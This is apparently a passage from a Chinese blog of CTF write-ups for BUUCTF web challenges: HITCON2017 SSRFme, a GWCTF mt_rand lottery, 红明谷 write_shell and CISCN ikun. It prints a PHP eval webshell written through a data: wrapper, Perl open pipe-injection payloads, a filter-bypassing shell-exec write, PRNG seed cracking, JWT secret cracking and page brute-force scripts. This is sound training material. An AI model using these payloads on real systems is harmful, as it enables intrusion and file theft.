    $sandbox = &amp;quot;sandbox/&amp;quot; . md5(&amp;quot;orange&amp;quot; . $_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;]);
    @mkdir($sandbox);
    @chdir($sandbox);

    $data = shell_exec(&amp;quot;GET &amp;quot; . escapeshellarg($_GET[&amp;quot;url&amp;quot;]));
    $info = pathinfo($_GET[&amp;quot;filename&amp;quot;]);
    $dir  = str_replace(&amp;quot;.&amp;quot;, &amp;quot;&amp;quot;, basename($info[&amp;quot;dirname&amp;quot;]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info[&amp;quot;basename&amp;quot;]), $data);
    highlight_file(__FILE__);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;实现发送 GET 请求给当前 GET 参数’url‘，并将其结果保存在 /sandbox/md5 (“orange” . $_SERVER [“REMOTE_ADDR”])/filename 中，其中 filename 为传入的 Get 参数。&lt;/p&gt;
&lt;p&gt;将 filename 存储在 /sandbox/md5 (“orange”+127.0.0.1)/filename 里面，url 是将读到的内容写入 filename 中&lt;/p&gt;
&lt;p&gt;通过 /sandbox/md5 (“orange”+127.0.0.1)/filename 可以访问得到&lt;/p&gt;
&lt;h3 id=&#34;2-路径泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-路径泄露&#34;&gt;#&lt;/a&gt; 2. 路径泄露&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;试试路径泄露，直接访问本机根目录：&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;http&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;59&lt;/span&gt;c29008&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ea1f&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;cf4&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;89&lt;/span&gt;c9&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;cb955abca7&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;node4&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;buuoj&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cn&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;81&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;filename&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;upload&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;此时发现 flag，就在根目录中：&lt;/p&gt;
&lt;p&gt;但是 GET 命令并不能读文件，此时想的是通过一个远程主机写好马，然后 get 完之后将马存储在 test.php 中，实现远程写马。但是因为没有公网 ip (还是穷)，而且推测 get 完远程主机返回的不一定是 php 代码而是 html，所以作罢，想想其他思路。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这里存在一个 readflag，于是测试一下访问它：&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;http&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;59&lt;/span&gt;c29008&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ea1f&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;cf4&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;89&lt;/span&gt;c9&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;cb955abca7&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;node4&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;buuoj&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cn&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;81&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;readflag&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;filename&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;upload&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;感觉是读 flag 的脚本，那现在需要做的就是执行它。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-思路一ssrf配合伪协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-思路一ssrf配合伪协议&#34;&gt;#&lt;/a&gt; 3. 思路一：SSRF 配合伪协议&lt;/h3&gt;
&lt;p&gt;联想到之前有个题目中是 file_put_contents 函数使用 data 伪协议控制其内容，这里想通过 GET 后加 data 伪协议实现写马，payload:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php-template&#34;&gt;?url=data:text/plain,&#39;&amp;lt;?php @eval($_POST[&#39;capt&#39;])?&amp;gt;&#39;&amp;amp;filename=upload/test.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;至于为什么需要引号，可以在 linux 中测试，如果不加引号，命令行会因为 &amp;lt;? 等符号解析错误。&lt;/p&gt;
&lt;p&gt;此时因为写入的文件名称后缀可以是 php，所以直接访问沙河中的 php 文件，再使用蚁剑连接。但是直接打开根目录的 flag 显示为空。所以在蚁剑中打开命令行，运行 readflag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BHITCON2017%5DSSRFme/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;4-思路二perl语言漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-思路二perl语言漏洞&#34;&gt;#&lt;/a&gt; 4. 思路二：perl 语言漏洞&lt;/h3&gt;
&lt;p&gt;这也是大部分题解中的思路，利用 perl 语言的漏洞：&lt;/p&gt;
&lt;p&gt;因为 GET 函数在底层调用了 perl 语言中的 open 函数，但是该函数存在 rce 漏洞。当 open 函数要打开的文件名中存在管道符（并且系统中存在该文件名），就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行。&lt;/p&gt;
&lt;p&gt;先创建该文件：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;/readflag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;再执行命令：&lt;/p&gt;
&lt;figure class=&#34;highlight makefile&#34;&gt;&lt;figcaption data-lang=&#34;makefile&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;readflag&amp;amp;filename&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;123&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;最后访问 123 文件即可。但是网上的 Payload 我都没成功。&lt;/p&gt;
&lt;h3 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;对于 ssrf 首先还是想到伪协议&lt;/li&gt;
&lt;li&gt;perl 语言的漏洞，管道符的利用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/CAPD/p/17858896.html&#34;&gt;(&lt;em&gt;´∇｀&lt;/em&gt;) 欢迎回来！ (cnblogs.com)&lt;/a&gt;&lt;/p&gt;

 &lt;h2 id=&#34;gwctf-2019枯燥的抽奖&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gwctf-2019枯燥的抽奖&#34;&gt;#&lt;/a&gt; [GWCTF 2019] 枯燥的抽奖&lt;/h2&gt;
&lt;h3 id=&#34;知识点伪随机数mt_rand函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点伪随机数mt_rand函数&#34;&gt;#&lt;/a&gt; 知识点：伪随机数：mt_rand () 函数&lt;/h3&gt;
&lt;p&gt;伪随机数（引用上面的链接内容）&lt;br&gt;
伪随机数是用确定性的算法计算出来的随机数序列，它并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，若使用的初值（种子）不变，那么伪随机数的数序也不变。伪随机数可以用计算机大量生成，在模拟研究中为了提高模拟效率，一般采用伪随机数代替真正的随机数。模拟中使用的一般是循环周期极长并能通过随机数检验的伪随机数，以保证计算结果的随机性。伪随机数的生成方法有线性同余法、单向散列函数法、密码法等。&lt;/p&gt;
&lt;p&gt;mt_rand 就是一个伪随机数生成函数，它由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;进来是这样的界面，发现是要写一些字符串，要写出剩下的字符串，源码有 check.php, 进去发现是源码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;5qfWJ4LPJv

&amp;lt;?php
#这不是抽奖程序的源代码！不许看！
header(&amp;quot;Content-Type: text/html;charset=utf-8&amp;quot;);
session_start();
if(!isset($_SESSION[&#39;seed&#39;]))&amp;#123;
$_SESSION[&#39;seed&#39;]=rand(0,999999999);
&amp;#125;

mt_srand($_SESSION[&#39;seed&#39;]);
$str_long1 = &amp;quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;;
$str=&#39;&#39;;
$len1=20;
for ( $i = 0; $i &amp;lt; $len1; $i++ )&amp;#123;
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
&amp;#125;
$str_show = substr($str, 0, 10);
echo &amp;quot;&amp;lt;p id=&#39;p1&#39;&amp;gt;&amp;quot;.$str_show.&amp;quot;&amp;lt;/p&amp;gt;&amp;quot;;


if(isset($_POST[&#39;num&#39;]))&amp;#123;
    if($_POST[&#39;num&#39;]===$str)&amp;#123;x
        echo &amp;quot;&amp;lt;p id=flag&amp;gt;抽奖，就是那么枯燥且无味，给你flag&amp;#123;xxxxxxxxx&amp;#125;&amp;lt;/p&amp;gt;&amp;quot;;
    &amp;#125;
    else&amp;#123;
        echo &amp;quot;&amp;lt;p id=flag&amp;gt;没抽中哦，再试试吧&amp;lt;/p&amp;gt;&amp;quot;;
    &amp;#125;
&amp;#125;
show_source(&amp;quot;check.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发现 mt_rand 函数，直接 php_mt_seed 启动！！！（不不不，还没，先把要字符串改成 php_mt_rand 看得懂的东西再说）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;str1=&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
str2=&#39;8D2SWQCXgH&#39;
length = len(str2)
res=&#39;&#39;
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;
            break
print(res)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;获得了一串可被 php_mt_seed 识别的数字&lt;/p&gt;
&lt;p&gt;直接进入 php_mt_seed:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;make
./php_mt_seed 这串数字
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;获得 seed 后通过脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;mt_srand&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;你的种子，如&lt;span class=&#34;token number&#34;&gt;880310233&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$str_long1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$len1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$len1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str_long1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mt_rand&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str_long1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;       &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接写入后获得 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;（工具真难下）&lt;/p&gt;

 &lt;h2 id=&#34;红明谷ctf-2021write_shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#红明谷ctf-2021write_shell&#34;&gt;#&lt;/a&gt; [红明谷 CTF 2021] write_shell&lt;/h2&gt;
&lt;p&gt;今天是考试日，但是还是得刷一题（虽然是签到题）&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
function check($input)&amp;#123;
    if(preg_match(&amp;quot;/&#39;| |_|php|;|~|\\^|\\+|eval|&amp;#123;|&amp;#125;/i&amp;quot;,$input))&amp;#123;
        // if(preg_match(&amp;quot;/&#39;| |_|=|php/&amp;quot;,$input))&amp;#123;
        die(&#39;hacker!!!&#39;);
    &amp;#125;else&amp;#123;
        return $input;
    &amp;#125;
&amp;#125;

function waf($input)&amp;#123;
  if(is_array($input))&amp;#123;
      foreach($input as $key=&amp;gt;$output)&amp;#123;
          $input[$key] = waf($output);
      &amp;#125;
  &amp;#125;else&amp;#123;
      $input = check($input);
  &amp;#125;
&amp;#125;

$dir = &#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;;
if(!file_exists($dir))&amp;#123;
    mkdir($dir);
&amp;#125;
switch($_GET[&amp;quot;action&amp;quot;] ?? &amp;quot;&amp;quot;) &amp;#123;
    case &#39;pwd&#39;:
        echo $dir;
        break;
    case &#39;upload&#39;:
        $data = $_GET[&amp;quot;data&amp;quot;] ?? &amp;quot;&amp;quot;;
        waf($data);
        file_put_contents(&amp;quot;$dir&amp;quot; . &amp;quot;index.php&amp;quot;, $data);
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;两个参数：action 和 data，第一个是用来确定方法，pwd 获取 upload 得文件的路径（dir: 显示目录的文件和子目录的列表），upload 上传文件的内容，写入文件中，&lt;/p&gt;
&lt;h4 id=&#34;过滤很多但是没有过滤反引号空格可以用t过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤很多但是没有过滤反引号空格可以用t过滤&#34;&gt;#&lt;/a&gt; 过滤很多，但是没有过滤反引号 ``，空格可以用 \t 过滤&lt;/h4&gt;
&lt;p&gt;直接获取：&lt;/p&gt;
&lt;p&gt;?action=upload&amp;amp;data=&lt;?=`cat\t/*`?&gt;&lt;/p&gt;
&lt;p&gt;在 pwd 的路径上访问，发现显示 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BhongmingguCTF2021%5Dwrite_shell/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;

 &lt;h2 id=&#34;ciscn2019-华北赛区-day1-web2ikun&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn2019-华北赛区-day1-web2ikun&#34;&gt;#&lt;/a&gt; [CISCN2019 华北赛区 Day1 Web2] ikun&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/buuctf5%E6%9C%8826%E6%97%A5/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;发现要先找到lv6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#发现要先找到lv6&#34;&gt;#&lt;/a&gt; 发现要先找到 lv6&lt;/h3&gt;
&lt;h4 id=&#34;找到lv6的脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#找到lv6的脚本&#34;&gt;#&lt;/a&gt; 找到 lv6 的脚本：&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;import requests
url=&amp;quot;http://c0fe0b30-9fdd-41ce-b289-8d6630c49212.node5.buuoj.cn:81/shop?page=&amp;quot;

for i in range(0,2000):
    print(i)
    r=requests.get( url + str(i) )
    if &#39;lv6.png&#39; in r.text:
        print (i)
        break
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;更高级的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#更高级的&#34;&gt;#&lt;/a&gt; 更高级的：&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;import threading
import time

import requests


def go(st, ed):
    for i in range(st, ed):
        url = &#39;http://c0fe0b30-9fdd-41ce-b289-8d6630c49212.node5.buuoj.cn:81/shop?page=&#39;
        url += str(i)
        r = requests.get(url, timeout=2)
        if &#39;lv6.png&#39; in r.text:
            print(r.url)
        time.sleep(0.1)


if __name__ == &#39;__main__&#39;:
    threads = []
    for i in range(0, 10):
        t = threading.Thread(target=go, args=(i * 20, (i + 1) * 20))
        threads.append(t)

    for item in threads:
        item.start()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;找到在 181 的页面上：&lt;br&gt;
&lt;img data-src=&#34;../images/buuctf5%E6%9C%8826%E6%97%A5/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;在进行购买，发现买不起，可以修改金额和折扣来买它，抓包后发现只能通过抓包来修改折扣，修改折扣后给你一个&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/buuctf5%E6%9C%8826%E6%97%A5/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以发现有个 cookie，猜测是&lt;/p&gt;
&lt;h4 id=&#34;jwt&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jwt&#34;&gt;#&lt;/a&gt; jwt&lt;/h4&gt;
&lt;p&gt;，直接复制 cookie，再&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qd3QuaW8=&#34;&gt;https://jwt.io&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;用 c-jwt-cracker 爆破 jwt256-bit-secret&lt;/p&gt;
&lt;p&gt;修改成 admin 将 jwt 换成该字符串，&lt;img data-src=&#34;../images/buuctf5%E6%9C%8826%E6%97%A5/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;登录这个网站 ctrl+u, 有个源码泄露&lt;img data-src=&#34;../images/buuctf5%E6%9C%8826%E6%97%A5/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/buuctf5%E6%9C%8826%E6%97%A5/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;知识点pickle&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点pickle&#34;&gt;#&lt;/a&gt; 知识点：pickle：&lt;/h3&gt;
&lt;p&gt;提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。&lt;/p&gt;
&lt;p&gt;pickle 模块只能在 python 中使用，python 中几乎所有的数据类型（列表，字典，集合，类等）都可以用 pickle 来序列化，&lt;br&gt;
pickle 序列化后的数据，可读性差，人一般无法识别。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;p = pickle.loads(urllib.unquote(become))
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp;amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为：
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;pickle.dump(obj, file, [,protocol])
函数的功能：将obj对象序列化存入已经打开的file中。
参数讲解：
obj：想要序列化的obj对象。
file:文件名称。
protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;pickle.load(file)
函数的功能：将file中的对象序列化读出。
参数讲解：
file：文件名称。
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;pickle.loads(string)
函数的功能：从string中读出序列化前的obj对象。
参数讲解：
string：文件名称。
&lt;/code&gt;&lt;/pre&gt;
